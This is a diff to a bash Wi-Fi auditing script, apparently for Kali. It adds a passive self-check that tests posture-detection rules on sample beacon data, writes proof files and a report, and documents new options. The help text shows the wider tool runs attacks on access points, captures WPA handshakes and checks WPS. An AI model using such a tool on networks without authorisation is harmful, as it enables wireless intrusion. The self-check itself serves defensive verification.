+		printf '\n## 3. Failed Checks\n'
+		if [[ "$nfail" -eq 0 ]]; then
+			printf 'None.\n\n'
+		else
+			while IFS=';' read -r id expect present status; do
+				[[ "$status" == "failed" ]] || continue
+				printf -- '- **%s** — detected %s, expected %s. Proof file: proof/sci/%s.conf\n' "$id" "$present" "$expect" "$id"
+			done <<<"$blob"
+			printf '\n'
+		fi
+		printf '## 4. Scientific Checks\n'
+		printf -- '- Verification (is the rule implemented correctly?): each finding is compared with the expected result from the literature. Done.\n'
+		printf -- '- Validation against real test data: not applicable. These are yes/no beacon rules, so there is no measured value to compare.\n'
+		printf -- '- Numerical stability, sensitivity, cross-validation: not applicable. There is no numerical or statistical model.\n\n'
+		printf '## 5. Performance\n'
+		printf -- '- Time used: %s ms. Limit: 30000 ms. Result: %s.\n\n' "$elapsed" "$tstat"
+		printf '## 6. Proof Files\n'
+		printf -- '- Folder: proof/sci/\n'
+		while IFS=';' read -r id expect present status; do
+			[[ -n "$id" ]] && printf -- '- proof/sci/%s.conf (%s)\n' "$id" "$status"
+		done <<<"$blob"
+		printf '\n## 7. Final Summary\n'
+		if [[ "$nfail" -eq 0 && "$tstat" == "ok" ]]; then
+			printf 'All posture checks matched the expected result from the literature, within the 30-second limit, and each result has a proof file. Note: the checks use sample beacon data, so they prove the detection logic is correct, not the behaviour of a real network on air.\n'
+		else
+			printf 'Some checks did not pass, or the time limit was reached. See sections 3 and 5.\n'
+		fi
+	} >"$r"
+}
+
+function selfcheck_run() {
+	local base pdir rdir tmp sar run_id start end el id present expect status tstat
+	local nconf=0 nfail=0 rows=""
+	base="${SELFCHECK_OUT:-$_WPS_SCAN_DIR}"
+	pdir="${base}/proof/sci"
+	rdir="${base}/reports"
+	if ! mkdir -p "$pdir" "$rdir" 2>/dev/null; then
+		print_log ERROR SELFCHECK "cannot create ${pdir} / ${rdir}"
+		return 1
+	fi
+	tmp="$(mktemp -d "${TMPDIR:-/tmp}/cpselfcheck_XXXXXX")" || return 1
+	run_id="$(date -u +%Y%m%dT%H%M%SZ)"
+	start="$(selfcheck_now_ms)"
+	sar="${tmp}/sar.jsonl"
+	selfcheck_build_sar "$sar"
+	LOG_DIR="$tmp"
+	REPORT_STATE_POSTURE="${tmp}/posture_reported.txt"
+	FOUND_TARGETS=("02:00:00:00:0a:01|x" "02:00:00:00:0c:03|x" "02:00:00:00:0d:04|x" "02:00:00:00:0e:05|x" "02:00:00:00:0f:06|x" "02:00:00:00:0b:02|x")
+	ENABLE_POSTURE_EXT=1
+	ENABLE_REPORT_DEDUP=0
+	build_posture_findings
+	end="$(selfcheck_now_ms)"
+	el=$((end - start))
+	local -A expect_map=(["F-PMF"]=yes ["F-NOWPA3"]=yes ["F-ENT"]=yes ["F-SSIDCONF"]=yes ["F-LEGACY"]=yes ["F-TRANSITION"]=yes ["F-SAEPK"]=no)
+	for id in F-PMF F-NOWPA3 F-ENT F-SSIDCONF F-LEGACY F-TRANSITION F-SAEPK; do
+		if [[ "$POSTURE_HTML" == *"$id"* ]]; then present=yes; else present=no; fi
+		expect="${expect_map[$id]}"
+		if [[ "$present" == "$expect" ]]; then
+			status=confirmed
+			nconf=$((nconf + 1))
+		else
+			status=failed
+			nfail=$((nfail + 1))
+		fi
+		selfcheck_write_proof "$pdir" "$id" "$expect" "$present" "$status" "$el" "$run_id"
+		rows+="${id};${expect};${present};${status}"$'\n'
+	done
+	tstat=ok
+	((el > 30000)) && tstat=timeout
+	selfcheck_write_report "$rdir" "$el" "$tstat" "$nconf" "$nfail" "$run_id" "$rows"
+	rm -rf "$tmp" 2>/dev/null || true
+	if [[ "$nfail" -eq 0 && "$tstat" == "ok" ]]; then
+		print_log OK SELFCHECK "Checks passed"
+	else
+		print_log WARN SELFCHECK "Checks failed"
+	fi
+	print_log INFO SELFCHECK "confirmed=${nconf} failed=${nfail} time_ms=${el} budget_ms=30000 report=${rdir}/posture-selfcheck.md"
+	[[ "$nfail" -eq 0 && "$tstat" == "ok" ]]
+}
+
 function main() {
-	local baseline_action="" baseline_path="" baseline_left="" baseline_right="" from_sar="" recon_mode=0 gps_test=0
+	local baseline_action="" baseline_path="" baseline_left="" baseline_right="" from_sar="" recon_mode=0 gps_test=0 selfcheck_mode=0
 
 	while (($# > 0)); do
 		case "$1" in
@@ -7024,6 +8275,10 @@ function main() {
 			gps_test=1
 			shift
 			;;
+		--self-check)
+			selfcheck_mode=1
+			shift
+			;;
 		--no-recon)
 			RECON_ON_START=0
 			shift
@@ -7046,6 +8301,9 @@ function main() {
 			printf '  --no-recon                         Skip the startup recon survey (scan loop only)\n'
 			printf '  --no-install                       Skip auto-install of missing tools (AUTO_INSTALL=0)\n'
 			printf '  --gps-test                         Diagnose the Android->Kali GPS bridge (termux-location/gpsd), print one fix, then exit\n'
+			printf '  --self-check                       Passive posture self-check: writes proof/sci + reports/, confirmed statuses, <=30s, then exit\n'
+			printf '  ENABLE_POSTURE_EXT=1              Extra posture findings in report: SSID-confusion, legacy TKIP/WPA1, WPA3 transition (set 0 to disable)\n'
+			printf '  ENABLE_CORPUS_POSTURE=1          Academic-corpus exposure findings (A-G) + VPN/web notes in the report (detection only, set 0 to disable)\n'
 			printf '  ENABLE_REPORT_DEDUP=1              Report each network once: recon + vuln reports skip already-reported BSSIDs; no empty reports (set 0 to disable)\n'
 			printf 'Env: IFACE, ENABLE_DRY_RUN, LOG_DIR, ENABLE_TRACE_RULES=1, ENABLE_VALIDATION=yes, ENABLE_VALIDATION_TRACE=yes, ENABLE_LOCATION=yes, ENABLE_SURVEY=yes, ENABLE_ASSESSMENT_RESULT=yes,\n'
 			printf '     ACTIVE_BSSID_ALLOWLIST / ACTIVE_ALLOWLIST_FILE,\n'
@@ -7053,6 +8311,22 @@ function main() {
 			printf '  DISABLE_DIAG_MONITOR_TEST=1        Skip monitor switch test in run_diag\n'
 			printf '  RSSI_ATTACK_MIN=-75              Skip attacks on APs weaker than -75 dBm\n'
 			printf '  SCAN_TIMEOUT=25                  Per-scan timeout in seconds (applies to iw scan)\n'
+			printf '  ENABLE_WATCH_TABLE=1             Live per-scan AP table (BSSID/vendor/signal/band/auth/WPS) in the scan loop (set 0 to disable)\n'
+			printf '  WATCH_FILTER=                    Case-insensitive filter for the live table (match BSSID/ESSID; empty = all)\n'
+			printf '  WATCH_HIDE_DONE=1                Live table hides already-checked networks (processed in a past cycle); set 0 to show all\n'
+			printf '  ENABLE_ADAPTIVE_RECON=1          Adaptive recon/scan triggers T1-T7 (iface reinit, churn/GPS recon, fast rescan on signal drop); set 0 to disable\n'
+			printf '  RECON_REFRESH_SECS=900           T5: re-run recon at least this often while scanning (periodic environment refresh)\n'
+			printf '  RECON_MIN_GAP=60                 Hysteresis: minimum seconds between adaptive recon runs (suppresses churn/GPS re-triggers)\n'
+			printf '  CHURN_PCT=60                     T2: BSSID set change (%% appeared/disappeared vs last cycle) that requests a recon\n'
+			printf '  RSSI_DROP_DB=15                  T4: median-RSSI drop in dB vs last cycle that triggers an immediate fast rescan (no cooldown)\n'
+			printf '  GPS_MOVE_M=150                   T3: movement in metres since last fix (needs GPS) that requests a recon\n'
+			printf '  EMPTY_CYCLE_LIMIT=2              T1: consecutive no-data scan cycles before the adapter is reinitialized\n'
+			printf '  ENABLE_LOCATION_WS=0             GPS fallback: when GPS/LBS give no fix, read coordinates from the phone browser page (location.html) over a local websocket; needs websocat\n'
+			printf '  LOCATION_WS_PORT=5555            Local websocket port the browser page connects to for the GPS fallback\n'
+			printf '  ENABLE_PSK_PROOF_PCAP=1          Save EAPOL 4-way pcap as proof during live PSK verification (needs tcpdump; set 0 to disable)\n'
+			printf '  LOG_LEVEL=INFO                   Console verbosity: DEBUG, INFO, WARN, ERROR (file and JSONL logs always keep everything)\n'
+			printf '  ENABLE_JSONL_LOG=1               Structured event log events.jsonl in LOG_DIR for automatic analysis (set 0 to disable)\n'
+			printf '  LOG_ROTATE_BYTES=5242880         Rotate cp_audit.log and events.jsonl above this size (keep LOG_ROTATE_KEEP old files)\n'
 			printf '  ENABLE_MOBILE_REEVAL=1            Enable mobile BSSID re-evaluation (default 0)\n'
 			printf '  REEVAL_RSSI_IMPROVE_DB=6          RSSI improvement threshold in dB (3..20, default 6)\n'
 			printf '  REEVAL_TTL_SEC=300                TTL for re-evaluation in seconds (60..3600, default 300)\n'
@@ -7102,6 +8376,10 @@ function main() {
 
 	if [[ "${gps_test:-0}" == "1" ]]; then
 		if location_fix; then exit 0; else exit 1; fi
+	fi
+
+	if [[ "${selfcheck_mode:-0}" == "1" ]]; then
+		if selfcheck_run; then exit 0; else exit 1; fi
 	fi
 
 	if [[ "${AUTO_INSTALL:-1}" == "1" ]]; then
